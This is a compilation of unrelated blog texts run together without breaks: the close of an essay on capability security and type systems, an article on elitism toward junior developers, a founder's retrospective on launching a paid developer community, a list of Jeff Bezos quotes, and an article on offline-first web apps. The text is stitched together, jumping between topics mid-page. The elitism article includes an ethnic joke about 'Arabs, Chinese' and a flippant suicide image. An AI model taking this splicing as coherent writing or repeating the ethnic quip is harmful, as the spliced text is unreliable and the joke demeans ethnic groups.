<p>A different approach would be to notice that there are typically a few common ways that you want to use an array and provide specific abstractions in the language that capture those uses. For example, it’s very common to want to iterate through the array performing some kind of calculation. Rather than making everyone manually write out the for-loops for doing this — do arrays in this language start at 0 or 1? Do they stop at array.length or array.length – 1? Do array indexes have a specific type? — you could instead offer a general <a href="http://www.cs.nott.ac.uk/~pszgmh/fold.pdf">fold </a>(reduce) operation. Likewise, instead of making people write their own hashtables you could provide one built-in to the language itself. By providing better abstractions you make it less likely that programmers will hit illegal states. </p>



<p>You can then go further and <em>remove</em> the more primitive operations, only allowing access to the higher level abstractions. Hopefully in 2020 most programmers would agree that removing goto statements in favour of higher level structured programming abstractions was a win, and the same can be true of other low-level constructs: nulls, raw memory pointers, etc. </p>



<p>In the world of computer security, there is a direct analogue of this discussion. The security model of most computer systems allows a separation between operations I <em>can</em> (try to) perform and operations I am <em>allowed</em> to perform: I can try and delete your website, but (hopefully) the request will be rejected as unauthorized. In contrast, in <a href="https://en.wikipedia.org/wiki/Object-capability_model">object-capability systems</a> my ability to even invoke such an operation depends upon me holding an unforgeable c<em>apability </em>granting me permission to perform it. It’s not possible to even attempt an operation that I am not allowed to perform. For example, in a REST API using <a href="https://neilmadden.blog/2019/01/16/can-you-ever-safely-include-credentials-in-a-url/">capability URIs</a>, I cannot simply send a DELETE request to /users/alice, but instead need to send it to some unguessable random URI – if I don’t already have that URI then I can’t even begin to send the request. Object-capability security therefore aims to make <em>unauthorized states unrepresentable</em>. </p>



<p>Perhaps the most widely known embodiment of the object-capability paradigm is the <a href="http://www.erights.org/">E programming language</a>: a <em>dynamically-typed</em> object-oriented programming language. Although now somewhat abandoned, it is a fascinating language with a lot of great ideas. E uses strong abstraction boundaries to ensure security. Be warned: the E website is a rabbit hole of incredible depth!</p>



<p>In my twenties, I used to do a lot of programming in <a href="https://wiki.tcl-lang.org/">Tcl</a>. A language that most would agree is about as far removed from a modern statically typed programming language as you can get. (Often pointed out with something close to utter disgust). And yet the idea of making illegal states unrepresentable was entirely natural to myself and other Tcl programmers. I would frequently start a programming project by creating a <a href="https://www.tcl.tk/man/tcl/TclCmd/interp.htm#M12">blank-slate interpreter</a>, stripping out all the built-in language constructs (<a href="http://nsl.com/">loops</a>, procedures, even <a href="https://tcl.tk/man/tcl/TclCmd/expr.htm">arithmetic</a>), and then adding back in a carefully selected set of high-level domain-specific primitives. This DSL would then become the application’s configuration file, safe in the knowledge that illegal configurations cannot be expressed. </p>



<p>To summarise, my point is not that type systems are bad or that the original essay is flawed. On the contrary, I thank the flying spaghetti monster almost every day for the type system in my day job (and that is only Java’s tepid concoction), and I think the “parse, don’t validate” essay is excellent. But the last two decades have seen such advances in type systems and the adoption of typeful programming patterns that we are in danger of thinking that type systems are the only way of achieving correctness in software construction. They are a tremendously powerful tool, but more basic techniques of abstraction and information hiding can be just as powerful. The goal of making illegal states unrepresentable should be one of the defining goals of software engineering, but there are many valid ways to crack that nut.</p>



<p><em>Shameless plug: I discuss capability URIs in depth in chapter 9 of <a href="https://www.manning.com/books/api-security-in-action">my book on API security</a>, just published by Manning. I also discuss using types to enforce security properties in chapter 6. </em></p>

<!-- Horizontal Top Article -->
<p>I received an email from a developer not long ago. She introduced herself and asked me if her knowledge was sufficient to become, and I quote, “a real developer”. I have received this exact email from so many different people that I am actually writing an article about it.</p>



<h3>A true developer</h3>



<p>Today we’re going to talk about the idea that some developers would be more developers than others.</p>



<p>It’s something that comes up all the time with the more junior developers. <strong>It’s something that concerns all developers.</strong></p>



<p>When you want to be part of a group, or a community more generally, you need to follow some rules and customs. There’s no escaping that. With tech, it’s obviously the same thing.</p>



<p>And for us, it translates into things like: “a real developer does C++”, or “a real developer never uses his mouse”, “a real developer spends all his free time on leetcode”, and other bullshit just like that.</p>



<p>I’ll spare you all the other examples, I’ve really read and heard everything.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">If you call yourself a developer and use a mouse for editing code, I just assume you are a junior.</p>— 🅾️shell (@_oshell) <a href="https://twitter.com/_oshell/status/1312206331277840384?ref_src=twsrc%5Etfw">October 3, 2020</a></blockquote>
</div></figure>



<p>On a senior developer all this has less effect. At worst, it could make you angry and you could start to slap people with your keyboard.</p>



<p><strong>On a junior developer, it’s catastrophic.</strong> Because while you’re building your skills and your vision of the job, you’re being harassed. Permanent questioning that makes no sense at all.</p>



<p>Confidence takes a hit and the ability to learn with it. Most of the time, just to please one person.</p>



<figure><img src="https://www.indiewire.com/wp-content/uploads/2020/04/shutterstock_editorial_5883926f.jpg" data-src="https://www.indiewire.com/wp-content/uploads/2020/04/shutterstock_editorial_5883926f.jpg" alt=""></figure>



<p><strong>And the tragedy begins when you learn things out of social pressure, not desire. </strong>It’s a never-ending story.</p>



<h3>The never-ending story</h3>



<p>I’ve been there. Like many people, I started with HTML/CSS/Javascript. <strong>The Holy Trinity of the world wide web.</strong></p>



<p>Very quickly, people told me that I wasn’t doing any real development.<strong> I wasn’t a real one</strong>. At best, I was a word processor.</p>



<p>A real developer makes real code, you know? A real language with objects, classes and all that goes with it. So I learned PHP.</p>



<p>And when you’re a PHP developer but you’re not a killer in a framework, it’s weird. People look at you as if you’ve just landed with your flying saucer. <strong>So Symfony became <a href="https://www.jesuisundev.com/en/religion-among-developers/" target="_blank" rel="noreferrer noopener">my religion</a>.</strong> </p>



<p>And then, people told that when you’re web developer, you’re not really a developer. <strong>You only make websites, it’s not complicated.</strong></p>



<p>So I learned Python. And then I was told that Python is too easy. <strong>To be a real developer, you have to wait for a more complex language like C++</strong>. So I learned C++ by trying to code a video game on Unreal Engine.</p>



<figure><img src="https://i.imgur.com/RkeV4V6.png" data-src="https://i.imgur.com/RkeV4V6.png" alt=""></figure>



<p>And I continued like that for years, from tool to tool and new knowledge to new knowledge. I remember losing all hope with some medium Leetcode questions. <strong>Am I really cut out for this job?</strong></p>



<p>Finally I came to understand that there was no end to it. I came to understand that it was only a problem in my head. A problem of elitism.</p>



<h3>Understanding elitism in 30 seconds</h3>



<p>Elitism exists everywhere. It’s not something that is unique to developers. <strong>That said, it is strongly present in our profession.</strong> And actually, it’s very logical.</p>



<p><strong>Development is a very complicated job.</strong> Anyone who thinks the opposite have an <a href="https://www.jesuisundev.com/en/the-unbelievable-developers-ego/" target="_blank" rel="noreferrer noopener">ego problem</a>. And when this complexity is “mastered”, especially with certain tools or certain ways of doing things, that’s when elitism appears.</p>



<p>What must be understood is that people who impose their elitism and their way of doing things as absolute truth do not do so without reason. They are people who have fought to reach their level of knowledge. <strong>Complex professions have this effect on people.</strong></p>



<p>Development is no exception.</p>



<figure><img src="https://img4.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/a-story-about-endings-1553207208.jpg" data-src="https://img4.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/a-story-about-endings-1553207208.jpg" alt=""></figure>



<p>As long as you haven’t struggled as much as they have, on subjects as complex as they have, you won’t be a “real” developer.</p>



<p>I hate that kind of attitude, but it’s human to react like that.<strong> I’ve caught myself having this kind of attitude before.</strong> Of course, in a teddy bear version of it. I’m not completely stupid.</p>



<p>But despite all my good will and hindsight, sometimes it happens.</p>



<h3>You are a developer</h3>



<p>Let’s be clear.</p>



<ul><li>If you make code, you’re a developer.</li><li>If you make code and get paid for it, you are a professional developer.<br></li></ul>



<p>What I want you to understand today is that both of these facts are true. And it doesn’t matter, your language, your tools and your level of knowledge.</p>



<p><strong>Don’t let anyone tell you otherwise.</strong></p>



<p>You are not a “fake developer”. It doesn’t exist.</p>



<p>But I know that feeling is strong at the beginning of your career. With time and experience, some of that feeling will disappear.</p>



<p>I’m not going to lie to you either. It’s never going to completely disappear. <strong>I don’t want to talk about the impostor syndrome today, because it’s a subject in itself.</strong> We’ll come back to it in a future article.</p>



<p>All I want you to understand today is that elitism is the basis of all this. <strong>People who do not hesitate to denigrate others just to prove things to themselves.</strong> And sometimes it takes on ridiculous proportions.</p>



<p>You’d be surprised how many devs are completely questioned when they change jobs or teams. <strong>It’s common and completely normal.</strong> Usually it puts the elitism back in place.</p>



<figure><img src="https://img2.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/why-did-caleb-have-to-die-1553207208.jpg" data-src="https://img2.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/why-did-caleb-have-to-die-1553207208.jpg" alt=""></figure>



<p><strong>Despite all these years of experience, nothing is fixed and absolute.</strong> The developers’ level is a long gray scale that moves constantly.</p>



<p>Not everything is black or white. There are also Arabs, Chinese, and people who think they are helping, but who only make things worse. </p>



<p><strong>Anyway, if your goal is to be more waterproof and feel better as a developer, there are two very simple things you can do right now.</strong></p>



<p>To feel better as a developer, I think you have to be pragmatic in the way you approach and do this job. And take the time to build knowledge with practice.</p>



<h3>The Pragmatic Programmer</h3>



<p>I remember the first thing that completely freaked me out as a junior was how much knowledge the other developers had around me. Especially in terms of best practices, code organization philosophy and general rules to make quality.</p>



<p>I always felt so overwhelmed. It seemed insurmountable. And in fact, if I hadn’t done anything, I was going to stay in the same situation.</p>



<figure><img src="https://img1.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/a-story-about-us-1553207208.jpg" data-src="https://img1.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/a-story-about-us-1553207208.jpg" alt=""></figure>



<p>Then one day I came across the book <strong><a href="https://amzn.to/338I2Tl" target="_blank" rel="noreferrer noopener">The Pragmatic Programmer</a></strong>. It was by far the book that gave me the most confidence in myself and my abilities. It obviously talks about technique, but not only that.</p>



<p>This book taught me the pragmatic approach of being a developer. And I apply advices from this book every day. <strong>It has calmed my anxieties towards my code, towards others, and especially towards myself.</strong></p>



<p>It taught me the principle of entropy in development. It’s responsible for most of the rotten codebase. He taught me how to talk requirements with a client. He taught me how to debug efficiently. He taught me how to solve “impossible” problems in my code. He taught me how to communicate with other developers efficiently. He taught me how to give feedback and especially how to receive negative feedback.</p>



<p><a href="https://amzn.to/338I2Tl" target="_blank" rel="noreferrer noopener"><strong>The Pragmatic Programmer</strong></a> is responsible for the confidence I have as a developer. And I recommend it to all developers, regardless of your level.</p>



<p>But all this is nothing without practice.</p>



<h3>Practice</h3>



<p>I could give you all the tips in the world to feel better as a developer, it won’t help if you don’t practice on your own.</p>



<p>And normally, I’m supposed to give you a list of side projects to do. Complete subjects, that make you touch everything. <strong>Boring topics that you’ll never finish before you shoot yourself in the head because of boredom.</strong> Believe me, it’s not going to help you learn anything.</p>



<figure><img src="https://img4.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/why-is-it-called-ex-machina-1553207208.jpg" data-src="https://img4.looper.com/img/gallery/the-ending-of-ex-machina-finally-explained/why-is-it-called-ex-machina-1553207208.jpg" alt=""></figure>



<p>I know this because, once again, have been there. And my advice is very simple. <strong>Do a project on a subject that really interests you.</strong> No matter how useful it is, no matter what language you use, no matter what concept you working with.</p>



<p><strong>If you do something you hate, you won’t finish it.</strong></p>



<p>How to come up with an idea then ? How do you motivate yourself? How do you find time? <a href="https://www.jesuisundev.com/en/side-projects/" target="_blank" rel="noreferrer noopener">I answer all this in the article dedicated to custom projects</a>.</p>



<p><a href="https://www.jesuisundev.com/en/side-projects/" target="_blank" rel="noreferrer noopener">A personal project is not a chore</a>. It’s by replacing the notion of chore by fun that you will do a lot of practice. <strong>And practice is the ultimate key to more confidence as a developer.</strong></p>



<h3>Epilogue</h3>



<p>No developer is “more” developer than others. No matter what language or tools you use. People who think otherwise, you can simply ignore them. This will allow you to focus on yourself. And that’s all that counts for more confidence in what you do.</p>

<p>Who’s got two thumbs and shipped her first of <a href="https://monicalent.com/12x-startup/">12 startups in 12 months</a> <em>on schedule</em>? That’s right, this girl.</p>

<p>In its first week, the <a href="https://bloggingfordevs.com/pro/" alt="Blogging for Devs Community (opens in a new tab)" target="_blank">Blogging for Devs Community</a>
 reached $5K in revenue through
a combination of lifetime deals, subscriptions, and my first ever Bitcoin transaction (thanks, Nico!).</p>

<p>A profitable first week isn’t what makes this a success in my book.</p>

<p>I’m <em>thrilled</em> at all the cool members who decided to join.
Exactly as I’d hoped, each person adds something unique and interesting to the community,
and I’m really excited to see where it goes.</p>

<p>So, welcome to my first monthly retrospective.</p>

<p>In this post I’ll be sharing a behind-the-scenes look at the first week of my paid community launch
and reveal what I’m shipping in November.</p>

<p>Below you’ll discover charts, graphs, screenshots, strategy, reflections, and my master plan
for growing Blogging for Devs through viral, generated content 🔮</p>

<p>I promise, it’s good.</p>



<p>First question: Did I really?</p>

<p>Before talking about what I’ve been up to in October, it’s important to
get on the same page about this:</p>

<p><strong>Even though I began charging to join the community this month, the community
itself was launched as a sort of “closed beta” back in July.</strong></p>

<p>The newsletter that helped me connect with first 100 free members (and most of the
paid members — more on that later) was launched in May.</p>

<p>You know what they say about overnight success.</p>

<p>Anyway, here’s what and how I launched in a month.</p>

<p><img src="https://bloggingfordevs.com/images/bfd-community-preview-image.png" alt="Blogging for Devs Pro Community"></p>

<p><a href="https://bloggingfordevs.com/pro/" alt="Blogging for Devs Community (opens in a new tab)" target="_blank">Blogging for Devs Community</a>
 is a paid
community for developers, makers, engineering managers, and technical founders to grow their blogs
through feedback, collaboration, and continuous learning.</p>

<p>We have accountability groups, virtual events and workshops, members-only resources and original content,
and most importantly — super kind and knowledgeable members.</p>

<p>For the first 250 people to join, it costs $12/month, $96/year, or $180 once.</p>

<p>The discussions are powered by <a href="http://circle.so/" alt="Circle (opens in a new tab)" target="_blank">Circle</a>
 and rocking
a custom theme I hacked together through highly specific CSS selectors and
vanilla JavaScript.</p>

<p><img src="https://monicalent.com/images/circle-code-snippets.png" alt="Vanilla JavaScript"></p>

<blockquote>
<p>And they say you only need to know React these days 😝</p>
</blockquote>

<p>It integrates with the Gatsby website through a custom OAuth provider, which uses Firebase
for authentication. It’s all serverless and cloud native and such.</p>

<p>In October, I built Events, a member RSS feed, signup, payment, the landing page, onboarding, profiles, welcome email sequence,
and a lean batch of starter content. I designed everything myself in Figma. For more granular detail on building the product,
you can see the day-to-day in my <a href="https://twitter.com/monicalent/status/1315678202988244993" target="_blank">twitter thread</a>.</p>

<p>Enough about tech, let’s talk launch.</p>

<p><img src="https://bloggingfordevs.com/images/bfd-pro-screenshot-2.png" alt="Blogging for Devs Community"></p>

<h2 id="success-metrics-why-you-won-t-find-an-overall-conversion-rate-in-this-report">Success metrics: Why you won’t find an overall conversion rate in this report</h2>

<p>My real goal for the community was to get
great people in, and not to overly optimize for converting anyone with a pulse.</p>

<p>That’s why my biggest launch fear wasn’t that no one would sign up.</p>

<p>It was that people I <em>don’t like</em> would sign up. Spammers, self-promoters, attention-seekers,
jerks.
Thankfully it hasn’t been the case and everyone is awesome so far 🤞</p>

<p>I try to scare those types away with a prominent Code of Conduct and an “Is this right for you?” checklist.</p>

<p><img src="https://monicalent.com/images/community-checklist.png" alt="Vanilla JavaScript"></p>

<p>That’s why I have no idea what my “conversion rate” for the community is and I don’t actually care.</p>

<p>I <em>do</em> pay attention to the opt-in rate for my free newsletter, though, so don’t take this as, “Girl doesn’t care about metrics.”</p>

<p>I care about metrics, just <em>not</em> on the community landing page.</p>

<p>The reason is, joining a community is a long-term thing.
Something like this often takes time and multiple exposures for people
to make the decision — it was the same for me and <a href="https://rosie.land/" alt="Rosieland (opens in a new tab)" target="_blank">Rosieland</a>
 and <a href="http://trends.co/" target="_blank">Trends</a>.</p>

<p>The more interesting question is this:</p>

<blockquote>
<p>What I can I learn about the members who did sign up, so I can find more people like them?</p>
</blockquote>

<p>With that, it’s chart time 👯‍♀️</p>



<p>Were paying members wooed by my slick landing page, or convinced by
a carefully crafted tweet?</p>

<p>Turns out, probably not.</p>

<p><img src="https://monicalent.com/images/community-launch-members.png" alt="Blogging for Devs Community Member Attribution"></p>

<p>Most new members were already subscribed to <a href="https://bloggingfordevs.com/" target="_blank">my free weekly newsletter</a> about blogging for developers, which is about 4,000 subscribers strong.</p>

<p>Every Friday for nearly six months, I’ve been sending out original content about
blogging, SEO, going viral, attracting an audience, and a splash of motivational moments. It takes me an entire day to write.</p>

<p>Out of 69 new paying members in the first week, <strong>only three were
unattributable</strong> at least one of three sources:</p>

<ol>
<li>Waitlister</li>
<li>Newsletter Subscriber</li>
<li>Twitter Follower</li>
</ol>

<p><img src="https://monicalent.com/images/community-launch-channels.png" alt="Blogging for Devs Paid Community Launch Channels"></p>

<blockquote>
<p><strong>Newsletter backstory:</strong> I started the newsletter in May, and it’s since grown to over 4,000 subscribers. If you want to know how, check out the writeups I’ve done <a href="https://bloggingfordevs.com/launch-a-newsletter/" alt="here (opens in a new tab)" target="_blank">here</a>
 and <a href="https://bloggingfordevs.com/product-hunt-launch/" target="_blank">here</a>.</p>
</blockquote>

<p>Many people had multiple touchpoints: subscriber <em>and</em> on the waitlist, or followed me on twitter
<em>and</em> subscriber to the newsletter.</p>

<p>However, only <strong>31% of new members follow me on Twitter</strong>. I’m not offended, to the contrary —
I prefer it.</p>

<p>Now I know that if I want to grow the community, the best thing I can do
is have more of the right people <strong>join the newsletter first</strong>.</p>

<p>That’s why my goal is to grow the newsletter, and trust that the community
will eventually benefit from the best subscribers joining up.</p>

<p>Let’s take a dip into revenue for a second.</p>

<h2 id="how-much-and-where-did-revenue-come-from">How much and where did revenue come from?</h2>

<p>As I said in the <a href="https://twitter.com/monicalent/status/1325008065041666049" alt="tweet (opens in a new tab)" target="_blank">tweet</a>
 where I collected ideas for this article, the $5K revenue is <em>not</em> MRR (monthly recurring revenue).</p>

<p>MRR for the Blogging for Devs Community is just $516 according to Stripe.</p>

<p>So where did the first week’s $5K in revenue come from?</p>

<p><img src="https://monicalent.com/images/community-launch-revenue.png" alt="Blogging for Devs Community Revenue"></p>

<p>Someone on Twitter recently asked me if I have any “thought leadership”
to spare on the topic of <strong>lifetime pricing</strong>.</p>

<p>I don’t.</p>

<p>Guess what, I’m neither optimizing for conversion nor <a href="https://en.wikipedia.org/wiki/Customer_lifetime_value" alt="LTV (opens in a new tab)" target="_blank">LTV</a>
 🙃</p>

<p>Offering a lifetime price at a lower cost than 2 years as a member is
really just a way for me to say “Thank you” to people who are in it for the long haul.</p>

<p>I see it as a mutual commitment.</p>

<h2 id="is-this-sustainable-yet">Is this sustainable yet?</h2>

<p>You might see $5K in a week and think it sounds like a lot of money. If only one
could extrapolate that to $20k/mo, then I’d be set.</p>

<p>But of course, it’s not the whole picture:</p>

<ul>
<li>Taxes and healthcare are super expensive here in Germany</li>
<li>I already spend over $300/mo on SaaS tools to run the community</li>
<li>Only $500 currently recurs monthly, assuming zero growth/churn</li>
</ul>

<p>Still, I have a <strong><em>very</em> long way to go</strong> before the community is sustainable.</p>

<p>That’s why my November startup is a side project to scale reach of the newsletter,
which should <em>in turn</em> drive the growth of the community.</p>

<p>I think marketers would call this a “funnel”.</p>

<p><img src="https://monicalent.com/images/community-funnel.png" alt="Blogging for Devs Community Funnel"></p>

<p>I think about it a little more like concentric circles approaching a core.</p>

<p>My next task is to expand the outermost ring with the kind of people who are
likely to join and enjoy the newsletter.</p>

<h2 id="my-master-plan-for-growing-blogging-for-devs-beyond-twitter-and-word-of-mouth">My master plan for growing Blogging for Devs beyond Twitter and word of mouth</h2>

<p>Channels die. Or at least, they become exhausted.</p>

<p>Although people still write me emails saying they’ve been following for
years, and just found out I have a newsletter — most of that is probably in the past.</p>

<p>People who know me, know about Blogging for Devs.</p>

<p>I really don’t want to spend all day on Twitter “growing my social media presence”.
I’d rather be building cool shit and helping other people build cool shit, too.
Let people find me through that.</p>

<p>Right now, word of mouth is what grows the newsletter.</p>

<p>Random mentions and links.  I find out through welcome emails or through
stalking my backlink reports from time to time.</p>

<p><img src="https://monicalent.com/images/newsletter-replies.png" alt="Lala"></p>

<blockquote>
<p>I do reply to everyone who emails me, but I was running a bit behind
after spending the prior week following the US election 🙈</p>
</blockquote>

<p>On average, I gain about 5-10 subscribers per day.</p>

<p>A prominent mention on Twitter, Indie Hackers, or the success of a subscriber’s
blog post can push than number over 100.</p>

<p><strong>The problem? Today, word of mouth isn’t sufficient to grow the newsletter quickly enough to reach sustainability in the near term.</strong></p>

<p>Ironically, I’m also a blogger with no spare time to grow it writing a ton of individual blog posts 😅</p>

<p>So how can I grow my newsletter about blogging, without blogging <em>myself</em>,
and without relying on Twitter for all my traffic?</p>

<p>Here comes the master plan. I hope it works.</p>

<h2 id="how-i-ll-build-traffic-to-blogging-for-devs-while-writing-virtually-no-blog-posts">How I’ll build traffic to Blogging for Devs (while writing virtually no blog posts)</h2>

<p>I have a theory. Well, I have a few theories.</p>

<p>The first one is this: Developers want to discover blogs written by other developers.
Reading company engineering blogs is fine, but quality content from their peers or individuals
they admire is far more interesting.</p>

<p>Most places to discover developer content feature individual articles. Hacker
News, Reddit, and Twitter all fundamentally work this way.</p>

<p>But what’s more interesting is the person behind the blog. Their personality, what makes them unique,
inspiring, and worth following in their own right.</p>

<p>To back this up, I present Exhibit A.</p>

<blockquote><div lang="en" dir="ltr"><p>Dear Tech Twitter:</p><p>What is your NUMBER ONE favorite blog by someone in tech, who has a <em>distinct writing style</em>? Where you read their articles for their <em>unique personality or voice</em>?</p><p>(Pls no list of twitter handles, direct link to the blog is 👍)</p></div>— Monica Lent (@monicalent) <a href="https://twitter.com/monicalent/status/1299054522074005504?ref_src=twsrc%5Etfw">August 27, 2020</a></blockquote> 



<p>Apart from the fact that asking for any kind of recommendation on Twitter is a
one-way ticket to pandemonium, you can tell from the replies that
people feel strongly about the topic. 400+ responses.</p>

<p>When I build something, I like that the topic evokes a response like this.</p>

<p><strong>It means people care.</strong></p>

<p>Extension of the theory (this time with less evidence): Many people who read
amazing tech blogs also aspire to create one themselves.</p>

<p>Ergo, if I create a place for people to discover the best developer blogs,
there’s a good chance people who show up will like my newsletter, too.</p>

<p>So here’s my plan.</p>

<p><img src="https://monicalent.com/images/bfd-rankings-social-preview.png" alt="Blogging for Devs Trends"></p>

<blockquote><p>Maintain a firm grasp of the obvious at all times.</p><cite><strong>Jeff Bezos </strong> </cite></blockquote>



<blockquote><p>If you’re not stubborn, you’ll give up on experiments too soon. And if you’re not flexible, you’ll pound your head against the wall and you won’t see a different solution to a problem you’re trying to solve.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>In the old world, you devoted 30% of your time to building a great service and 70% of your time to shouting about it. In the new world, that inverts.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>

<blockquote><p>When you receive criticism from well-meaning people, it pays to ask, ‘Are they right?’ And if they are, you need to adapt what they’re doing. If they’re not right, if you really have conviction that they’re not right, you need to have that long-term willingness to be misunderstood. It’s a key part of invention.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>If you decide that you’re going to do only the things you know are going to work, you’re going to leave a lot of opportunity on the table.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>

<blockquote><p>No business can continue to shrink. That can only go on for so long before irrelevancy sets in.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>As a company, one of our greatest cultural strengths is accepting the fact that if you’re going to invent, you’re going to disrupt.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>Start With the Customer and Work Backward</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>The Post is famous for its investigative journalism. It pours energy and investment and sweat and dollars into uncovering important stories. And then a bunch of websites summarize that [work] in about four minutes and readers can access that news for free. One question is, how do you make a living in that kind of environment? If you can’t, it’s difficult to put the right resources behind it. … Even behind a paywall, websites can summarize your work and make it available for free. From a reader point of view, the reader has to ask, ‘Why should I pay you for all that journalistic effort when I can get it for free from another site?</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>



<blockquote><p>Position yourself with something that captures your curiosity, something that you’re missionary about.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>

<blockquote><p>The missionary is building the product and building the service because they love the customer, because they love the product, because they love the service. The mercenary is building the product or service so that they can flip the company and make money.</p><cite> <strong>Jeff Bezos </strong>  </cite></blockquote>

There are a lot of developers complaining about issues with Jekyll plugins that are not supported by Github Pages. We can use Github Actions and commit our build to another branch and configure Github Pages to use that branch for deploying our website.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393390920/_sH5RujzQ.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Most web application developers reach for the tried and tested approach of fetching data from their API right when they need it, and they don't give an offline-first approach the consideration it deserves. Perhaps that's because working offline is generally thought of as a specific feature and that it's not necessarily applicable or appropriate for a wide variety of applications. However, there's a lot to be gained from going offline-first, even if your app isn't the "typical" offline application. Hopefully, after reading this article, you'll feel like you're better equipped to answer if working offline-first is right for your app.</p>

<p>When we say "offline-first", we don't just mean a bit of caching that means your user can revisit some pages they've already seen before. Many web apps make heavy use of the browser cache to achieve some basic level of functioning without a working internet connection. We're talking about going well beyond that.</p>
<p>For us, an offline-first web application is an application that is designed to be (close to) fully-functional without an internet connection. Now of course, the application may need an internet connection the first time around to authenticate the user and download some data. However, after that initial sync, it should be able to function without internet connectivity for some period of time. This means that not only browsing data (i.e. read operations) should work, but the user should also be able to create and update data (i.e. write operations) while in a disconnected state.</p>
<p>There are a million and one ways to achieve this kind of offline-first functionality. There's the browser cache, service workers, local storage, IndexedDB and a myriad of other tools that can be brought together to give your users a brilliant offline experience. </p>
<p>Inspired by the offline-first tools we use every day like Superhuman, Figma and Pitch, we've recently been working hard to turn <a target="_blank" href="https://kitemaker.co/">Kitemaker</a>, our product management tool for cross-functional, self-organizing product teams, into an offline-first application. We fetch the data the user may need ahead of time and store it in a local cache. The web application itself operates on that local cache only, and a separate layer takes care of syncing those changes back to the server. Our design was heavily inspired by the work Evan Wallace published about <a target="_blank" href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/">how multiplayer behavior works in Figma</a>. We're currently working on using service workers to download static assets and using IndexedDB to back our cache with persistent storage. We'll do a follow-up blog post on how offline works in Kitemaker, but here's a quick peek at the architecture:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393439657/Q9T8clsHl.png?auto=format&amp;q=60" alt="offline_architecture.png"></p>
<p>But this is just one example of how to achieve offline functionality. Exactly how you solve it will depend heavily on your application. The important part is that you start to think about whether your app <em>should</em> be offline-first.</p>

<p>You may be thinking that offline functionality sounds nice, but isn't super relevant most applications. We tend to disagree. We think there is a trend to push more and more SaaS products towards supporting working offline, and we think this is absolutely the right idea.</p>
<ul>
<li>Is your application's performance (how fast it responds to your users' inputs) important/critical?</li>
<li>Will your users be using your application in areas with spotty connectivity?</li>
<li>Will your users by using your application on airplanes?</li>
<li>Will your users be using your application when roaming on their data connections, such as when on vacation?</li>
</ul>
<p>We'd be surprised if you didn't answer "yes" to at least a couple of those questions.</p>

<p>There are a bunch of advantages that come along with making your application offline-first:</p>
<ul>
<li><strong>It'll work offline.</strong> Yep, that's right. If you make your application work offline, it will in fact work offline 😊 It's actually a pretty killer feature and one which we appreciate greatly, especially when traveling/commuting.</li>
<li><strong>It'll survive flaky networks.</strong> There's nothing worse than getting an error on a web application just because your network had a hiccup. We really wish more chat applications (you know who you are) worked offline-first to avoid bad behavior on bad networks.</li>
<li><strong>It'll make your application react quicker to your users' inputs.</strong> Instead of waiting for a server roundtrip to update a UI, offline-first applications can behave optimistically and update local data right away and then send off changes to the server. This means your users don't need to wait around for the response.</li>
<li><strong>It sets you up nicely for "multiplayer" behavior.</strong> In order to make your application work offline, you  need to be able to handle conflicts that might arise when your users come back online and start shipping queued changes to your servers. Handling these queued operations is very often the same type of logic that's needed to handle two users operating on the same data at the same time, which means you might be able to unlock more collaborative features of your application.</li>
<li><strong>It can help you scale your writes on your server.</strong> Because your users aren't waiting around for responses from the server, you can treat your writes a bit differently. Maybe you queue them up for processing, or adopt a <a target="_blank" href="https://www.martinfowler.com/bliki/CQRS.html">CQRS</a> and <a target="_blank" href="https://www.martinfowler.com/eaaDev/EventSourcing.html">event sourcing</a> approach. It opens up all sorts of possibilities.</li>
<li><strong>It can simplify your app logic.</strong> For us in Kitemaker, this was a big one. Before we adopted this offline-first approach, our GraphQL API calls had wormed their way into our code in a lot of places. Whenever changing data, we had to set up a GraphQL mutation, handle the response, provide optimistic responses to get the performance we need, etc. It was messy and complex. Now we just operate on objects in our local cache and the changes are transparently synced to our backend (and onwards to other users).</li>
<li><strong>It can simplify your backend API.</strong> This one is not guaranteed by any means, but for us, our backend API became a very simple thing indeed. Instead of create/update/delete endpoints (or in our case mutations since we use GraphQL) for all of the different resources in our system, we now have a really simple API for sending changes from the client to the server. That's it. Of course YMMV.</li>
</ul>

<p>While there are numerous advantages to working in an offline-first, it's not a given that you should dive in right away. Think about these things a little first:</p>
<ul>
<li>Is the data your users need to interact with reasonable small or can you chunk it into smaller datasets that your users can selectively choose to download for offline use (e.g. restaurant recommendations for a particular country/city)? If not, it will be very hard to build a good offline experience.</li>
<li>Can you ensure that most operations that your users perform while offline will succeed? Being offline-first does not lend itself to applications where your users will frequently get their requests rejected, transactions will be get rolled back, etc. Basically you need to ensure you have a very simple and deterministic way to handle any conflicts that might occur. If you can't ensure this, you'd better think twice before digging in.</li>
<li>It can be <em>a lot</em> of work to get it right. There are tools out there to help you, but you won't get offline-first behavior for free. You need to decide if it's worth the investment for your product or not.</li>
</ul>

<p>We hope this article got your gears turning a little when it comes to offline-first web applications. We don't think appropriate for every application - it can be quite a lot of work to get right and for some applications it just doesn't make a lot of sense. But we just think people should give it some thought when designing and architecting a new application. We've learned from experience that retrofitting this type of behavior can also be quite a lot of work, but we're super happy we did it nonetheless!</p>

